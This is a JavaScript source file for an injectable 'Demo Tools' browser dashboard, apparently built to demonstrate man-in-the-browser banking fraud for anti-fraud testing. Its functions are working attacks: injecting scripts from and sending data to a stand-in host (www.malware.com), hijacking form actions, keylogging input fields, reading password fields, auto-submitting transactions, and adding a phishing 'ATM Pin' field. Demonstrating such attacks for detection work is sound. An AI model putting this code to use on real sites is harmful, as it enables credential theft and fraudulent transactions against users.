var doc = document;
function init(jQuery) {

	// settings
	var toolkitName = "Demo Tools";//"demoTools";
	var version = "";//"Beta 0.1.67";
	var startMessage = "Ready!";//"Version " + version + "  Ready!";
	var receivingDomain = location.protocol + "//www.malware.com";

	function log(msg) {
		if (typeof console !== undefined && console.log) {
			console.log(msg);
		}
	}

	log(toolkitName + " loading...");

	// constants
	var dashID = "vTools";
	var styleID = "vToolsStyle";
	var consID = "vToolsconsole";
	var tooltipsID = "tooltipsBA";
	var closeID = "closeBA";
	var warn = "warnBA";
	var highlight = "highlightBA";
	var circled = "circledBA";
	var activeButton = "activeButtonBA";
	var $container = jQuery("body");
	var functions = {};
	var $dash;
	var $cons;
	var consoleWait = 4000;

	// flags
	var moving = false;
	var keyloggerOn = false;

	// mouse location - for drag/drop & tooltips
	var mouseX = 0;
	var mouseY = 0;

	// CSS
	var styleText = "#" + dashID + "{position: fixed; min-height: 200px; background:#333;top:40px;right:35px;z-index: 99998;border-radius: 10px;padding: 10px;}";
	styleText += "#" + dashID + " button {float: right; clear: both;background-color:#fcfcfc;border-radius:6px;border:1px solid #333;width: 100%; display:inline-block;color:#333;font-family:arial;font-size:15px;font-weight:bold;padding:6px 24px;text-decoration:none;cursor:pointer;}";
	styleText += "#" + dashID + " button:hover {background-color:#468ccf;}"
	styleText += "#" + dashID + " button:active{position:relative;top:1px;}"
	styleText += "#" + consID + "{cursor: move; height:40px;color:#fcfcfc;font-size:15px;overflow-y: hidden;overflow-x: hidden;width: 300px}";
	styleText += "#" + consID + ".logging{word-break: break-all;}";
	styleText += "#" + tooltipsID + "{background:#333;color:#fcfcfc;font-size:14px;padding:3px;position:absolute;display:none;z-index:99999;border-radius:7px;padding:6px;width:250px}";
	styleText += "#" + closeID + "{position:absolute;right:12px;color:#468ccf;cursor:pointer}";
	styleText += "." + highlight + "{background:red !important;cursor: pointer !important;}";
	styleText += "." + warn + "{background:red !important;cursor: pointer !important;font-size:18px!important;color:black!important;font-weight:bold!important;border-radius:10px;padding:5px;}";
	styleText += "." + activeButton + "{background:rgb(255, 170, 170) !important;}";
	styleText += "." + circled + "{border:solid 5px red !important; cursor: pointer !important;}";
	// end of CSS

	// for pages without a body
	var containerSelectors = ["body", "html", "head", "div"];
	for (var i = 0; !$container.size(); i++) {
		$container = jQuery(containerSelectors[i]).eq(0);
	}

	// Write to dashboard console - clear console after wait
	function note(message, clear, red) {
		message = message || "";
		var $cons = jQuery("#" + consID);
		$cons.removeClass("logging")
		.scrollTop(0)
		.text(message);
		if (red) {
			$cons.addClass(warn);
		} else {
			$cons.removeClass(warn);
		}
		if (clear === true) {
			clear = consoleWait;
		}
		if (typeof clear === "number") {
			// clear console
			setTimeout(note, consoleWait);
		}
	}

	// Display tooltip
	function showTip(message) {
		if (typeof message === "string") {
			$tips.text(message).show();
		} else {
			$tips.hide();
		}
	}

	function checkRequest(url) {
		if (!isListeningForAlerts) {
			return;
		}
		// domainList shortest first
		var domainsList = "10stat.com 20stat.com bcstat.net mpstat.net ubstat.com banstat.com atbstat.com alstats.com bawstat.com raistat.com dbstats.net banostat.com postestat.com windstats.net saf.sparkasse.at"
			var domains = domainsList.split(" ");
		for (var i = domains.length - 1; i >= 0; i--) {
			if (url.indexOf(domains[i]) >= 0) {
				note("An alert was sent to " + domains[i], undefined, true);
				return;
			}
		}
	}

	var isListeningForAlerts,
	snifferHooked;
	function listenForAlerts() {
		if (isListeningForAlerts) {
			// Switch off listener
			isListeningForAlerts = false;
			return;
		}
		if (!snifferHooked) {
			snifferHooked = true;
			var replacementName = "_DEMO_AJAX";
			function handleAJAX(method, url, async) {
				try {
					checkRequest(url);
				}
				finally {
					this[replacementName].apply(this, arguments);
				}
			}
			if (window.XMLHttpRequest) {
				XMLHttpRequest.prototype[replacementName] = XMLHttpRequest.prototype.open;
				XMLHttpRequest.prototype.open = handleAJAX;
			}
			if (window.ActiveXObject) {
				ActiveXObject.prototype[replacementName] = ActiveXObject.prototype.open;
				ActiveXObject.prototype.open = handleAJAX;
			}
			setInterval(function () {
				jQuery("img").each(function () {
					checkRequest(this.src)
				});
			}, 500);
		}
		isListeningForAlerts = true;
	}

	/**
	 * Add button to dash 		- must be called before dash loads
	 * @param {string} buttonText
	 * @param {function} func 	- called when button is pushed
	 * @param {string} tipText 	- optional tooltip
	 *
	 */
	function registerButton(buttonText, func, tipText, toggle) {
		functions[buttonText] = {
			f : func,
			alt : tipText,
			toggle : toggle
		};
	}

	// Drag/drop the dash
	function move($ev) {
		if (moving) {
			$dash.css({
				right : "auto",
				top : ($ev.pageY - 30) + "px",
				left : ($ev.pageX - 70) + "px"
			});
		}
	}

	// Create element if it doesn't exist
	function findOrCreate(tag, id, parent) {
		var $elm = jQuery("#" + id);
		if ($elm.size()) {
			return $elm;
		} else {
			$parent = parent ? jQuery(parent) : $container;
			$elm = jQuery("<" + tag + ">");
			$elm.attr("id", id);
			$parent.append($elm);
			return $elm;
		}
	}

	/* 	START: define custom functions 		*/

	// Define button functions here

	function checkComponents() {
		var results = [];
		if (typeof "".intern === "function") {
			results.push("vCrypt");
		}
		if (typeof Math.inc === "function") {
			results.push("vHTML");
		}
		if (typeof[].equals === "function") {
			results.push("vTrack");
		}
		var message = (results.join(" & ") || "No") + " components found";
		note(message);
	}

	/**
	 * Highlights elements that match selector and runs
	 * callback function (with the clicked element as `this`)
	 */
	function promptForElement(selector, callback) {
		var $els = jQuery(selector, doc);
		var done;
		if (!$els.size()) {
			// No elements that match selector
			return false;
		}
		// not delegated - for cases of stopPropogation
		$els.addClass(highlight).on("click.promptForElement", function () {
			jQuery("." + highlight, doc).off("click.promptForElement").removeClass(highlight);
			if (!done) {
				done = true; // so later listeners won't run callback
				callback.call(this);
			}
		});
		// Listener setup
		return true;
	}

	function autoFillAndSubmit() {
		var dummyData = "7777777";
		var form = this;
		var elms = form.elements;
		var formData = {},
		i = 0,
		el;
		for (; i < elms.length; i++) {
			el = elms[i];
			if (el && el.name && el.tagName) {
				formData[el.name] = el.value || dummyData;
			}
		}
		var formData = JSON.parse(prompt("form data", JSON.stringify(formData)));
		for (var name in formData) {
			if (formData[name] && formData.hasOwnProperty(name) && form[name]) {
				form[name].value = formData[name];
			}
		}
		form.submit();
	}

	function automaticSubmit() {
		var formIndex = 0;

		var form = document.getElementsByTagName("form")[formIndex];
		autoFillAndSubmit.call(form);
	}

	function insertMaliciousScript() {
		var url = prompt("Malicious domain", receivingDomain);
		addNewElementToDom("script", {
			src : url + "/?v=" + parseInt(Math.random() * 1E9, 10)
		});
		note("Inserted malicious script tag", true);
	}

	function revealPassword() {
		var $selector = "input[type=password]";
		note("Click on a password field to steal its contents");
		promptForElement($selector, function () {
			alert("Field value: " + (this.value || " * empty * "));
			log("Field value: " + (this.value || " * empty * "));
		}) || note("No password field found");
	}

	function injectTrojan() {
		// tatangakatanga
		note("Imitating the tatangakatanga trojan", true);
		var newDiv = jQuery("<div>").css("visibility", "hidden").html("tatangakatanga");
		jQuery(doc.body).append(newDiv);
	}

	function sendAjax() {
		var url = prompt("Malicious domain", receivingDomain);
		note("Sending malicious data", true);
		jQuery.get(url + "/?v=" + parseInt(Math.random() * 1E9, 10));
	}

	function changeContextWindow() {
		$frames = jQuery("iframe, frame");
		if (!$frames.size()) {
			note("This page does not contain frames");
			return;
		}
		note("Select a frame");
		var done = false;
		var $overlays = jQuery();
		$frames
		.each(function () {
			var $this = jQuery(this);
			var $overlay = jQuery("<div>");
			$overlays = $overlays.add($overlay);
			$overlay
			.addClass("_BA_overlay " + circled)
			.css({
				height : $this.height(),
				width : $this.width(),
				position : "absolute",
				top : $this.offset().top,
				left : $this.offset().left,
				cursor : "pointer",
				background : "rgba(255, 0,0,0.2)"
			})
			.data("frame", this);
			$container.append($overlay);
		});
		$overlays.on("click", function () {
			if (!done) {
				done = true;
				$this = jQuery(this);
				try {
					if (
						document.location.href.replace(/^https?:\/\/(www\.)?|[\/\?#].*$/g, "") ==
						$this.data("frame").src.replace(/^https?:\/\/(www\.)?|[\/\?#].*$/g, "")) {
						doc = $this.data("frame").contentWindow.document;
						note("Successfully entered the frame");
					} else {
						throw "failed to enter frame";
					}
				} catch (err) {
					note("Can't enter frame. Opening it in a new tab");
					window.open($this.data("frame").src);
				}
				$overlays.remove();
			}
		});
	}

	function logKeys() {
		var $cons = jQuery("#" + consID);
		var cb = function () {
			// simple keylogger on keypress event. Outputs to note()
			$cons.addClass("logging"); // make console scrolling
			note("KEYS LOGGED: ");
			jQuery(this).on("keypress.keylogger", function ($ev) {
				note($cons.text() + String.fromCharCode($ev.charCode));
				var scroll = $cons.scrollTop() + $cons.height();
				if ($cons.get(0).scrollHeight !== scroll) {
					// scroll down
					$cons
					.stop()
					.animate({
						scrollTop : scroll
					}, 200);
				}
			})
		}

		// make button toggle
		var keyloggerButton = jQuery("#" + dashID + " button").filter(function () {
				return /S....? Keylogger/i.test(jQuery(this).text())
			});
		if (!keyloggerButton.size()) {
			throw "keyLogger button not found. Perhaps the button text has been changed?";
		}
		if (/Start/.test(keyloggerButton.text())) {
			note("Keys logged: ");
			promptForElement("input", cb) || note("No fields found");
		} else {
			jQuery("input").off("keypress.keylogger");
		}

	}

	function addField() {
		var html = "<br /><label for='stolen'>ATM Pin: </label><input name='stolen'/>";
		note("Select an input. form to add field");
		var cb = function () {
			jQuery(html).insertAfter(this);
		}
		promptForElement("input", cb) || note("No fields found");
	}

	function removeScripts() {
		// For phishing only - Mark's request
		// Not sure about this
		note("Scripts removed for Phishing", true);
		jQuery("script").remove();
	}

	function redirectFormAction() {
		var $forms = jQuery("form", doc);
		if (!$forms.size()) {
			note("No forms found in page");
			return;
		}
		note("Select a form");
		var done;
		$forms.addClass(circled).on("click", function () {
			if (!done) {
				done = true;
				this.action = prompt("Redirect form to:", this.action) || this.action;
				jQuery("." + circled).removeClass(circled);
			}
		});
	}

	/* 	END: define custom functions 		*/

	/* 	START: Register buttons 		- tooltip is optional	*/
	registerButton("Insert malicious JavaScript", insertMaliciousScript);
	registerButton("Imitate known Trojan", injectTrojan);
	registerButton("Send user data via AJAX", sendAjax);
	registerButton("Hijack form action", redirectFormAction, "Change where the form send its data to");
	registerButton("Start browser-based keylogger", logKeys, "Set up an in-browser keylogger for an input field", true);
	registerButton("Steal password", revealPassword, "Get current value of a password field");
	registerButton("Generate automated transaction", automaticSubmit, "");
	registerButton("Insert form field", addField, "Add a malicious field to the form");
	//registerButton("Check Versafe Components", checkComponents, "May not be compatible with old versions of vTrack");
	//registerButton("Jump into frame", changeContextWindow, "Runs tests in iframe. If iframe can't be accessed, it's opened in a new tab");
	//registerButton("Track alerts", listenForAlerts, "Shows when an alert is sent", true);
	//registerButton("Delete scripts from source", removeScripts, "For phishing only");
	/* 	END: Register buttons 				*/

	// Main div
	$dash = findOrCreate("div", dashID).show();

	if ($dash.data(toolkitName)) {
		// this button set is already here
		log("Toolkit " + toolkitName + " already added (version: " + version + ")");
		return;
	} else {
		// register that we're adding the kit, so it doensn't get added twice
		$dash.data(toolkitName, version);
	}

	var $style = findOrCreate("div", styleID);
	$style.html("<style>" + (styleText.replace(/([;}])/g, "$1\r")) + "</style>"); //workaround for IE - can't change innerHTML of <style>
	$close = findOrCreate("div", closeID, $dash).html("&#10008;"); // close button
	$cons = findOrCreate("div", consID, $dash); // console
	$tips = findOrCreate("div", tooltipsID, $container); // tolltips

	var $tools = jQuery("<div>"); // buttonset. Create, even if a button set is found (add another kit)
	var $btn;
	$tools.addClass("toolGroup");
	for (var fn in functions) { // add registered buttons
		if (functions.hasOwnProperty(fn)) {
			$btn = jQuery("<button>");
			$btn.html(fn);
			$btn.on("click", functions[fn].f);
			if (functions[fn].toggle) {
				$btn.on("click", function () {
					jQuery(this).toggleClass(activeButton)
				});
			}
			if (functions[fn].alt) {
				(function () {
					var tip = functions[fn].alt;
					$btn.hover(function () {
						showTip(tip);
					}, showTip);
				})()
			}
			$btn.appendTo($tools);
		}
	}
	$tools.appendTo(jQuery("#" + dashID));

	// Detach event listeners. Don't attach twice.
	$close.off("click.closeBA");
	$cons.off("mousedown.dragg");
	jQuery(document).off("mouseup.dragg");
	jQuery(document).off("mousemove.dragg");
	jQuery("button").off("mousemove.tiplocation")

	// Add event listeners for close, drag/drop, tooltips
	$close.on("click.closeBA", function () {
		$dash.fadeOut("slow");
	});
	$cons.on("mousedown.dragg", function () {
		moving = true;
	})
	jQuery(document).on("mouseup.dragg", function () {
		moving = false;
	});
	jQuery(document).on("mousemove.dragg", move);
	jQuery("#" + dashID + " button").on("mousemove.tiplocation", function ($ev) {
		$tips.css({
			"top" : ($ev.pageY + 3 + parseInt($tips.css("height"))) + "px",
			"left" : ($ev.pageX - 15) + "px"
		});
	}).on("click", showTip);

	// Done
	note(startMessage);
	log(toolkitName + " " + version + " ready!");

	// expose jQuery 1.9
	window.vTool_jkweery = jQuery;
}

function addNewElementToDom(tag, attrMap, parent) {
	var i,
	element = doc.createElement(tag);
	parent = parent || doc.body;
	for (i in attrMap) {
		element.setAttribute(i, attrMap[i]);
	}
	parent.appendChild(element);
	return element;
}

(function () {
	function jQueryLoaded() {
		// Check if required jQuery version is in page
		requiredVersion = 1.7;
		if (window.jQuery && window.jQuery.fn && parseFloat(window.jQuery.fn.jquery) >= requiredVersion) {
			return window.jQuery;
		}
		return window.vTool_jkweery; // tool already loaded jQuery
	}

	function loader() { // Run immediately
		if (jQueryLoaded()) {
			// revert the rest of the page back to the old jQuery version (if there is one)
			var j = window.jQuery.noConflict(true);
			// pass the jQuery object to init()
			init(j);
		} else {
			// try again soon
			setTimeout(loader, 250);
		}
	};

	var j = jQueryLoaded();
	if (j) {
		init(j);
	} else {
		// insert jQuery
		addNewElementToDom("script", {
			src : "scripts/jquery.min.js"
		}, document.head);
		loader();
	}
})()
